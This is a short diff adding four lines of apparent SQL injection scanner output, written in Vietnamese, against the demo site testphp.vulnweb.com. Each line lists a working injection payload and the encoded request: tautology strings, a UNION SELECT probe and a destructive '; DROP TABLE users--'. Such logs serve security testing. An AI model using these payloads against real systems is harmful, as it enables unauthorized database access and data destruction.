@@ -1,0 +1,4 @@
+[🔥] Dính SQLi với payload: ' OR '1'='1 trên http://testphp.vulnweb.com/listproducts.php?cat=1%27%20OR%20%271%27%3D%271
+[🔥] Dính SQLi với payload: ' UNION SELECT null,null-- trên http://testphp.vulnweb.com/listproducts.php?cat=1%27%20UNION%20SELECT%20null%2Cnull--
+[🔥] Dính SQLi với payload: ' OR 'a'='a trên http://testphp.vulnweb.com/listproducts.php?cat=1%27%20OR%20%27a%27%3D%27a
+[🔥] Dính SQLi với payload: '; DROP TABLE users-- trên http://testphp.vulnweb.com/listproducts.php?cat=1%27%3B%20DROP%20TABLE%20users--
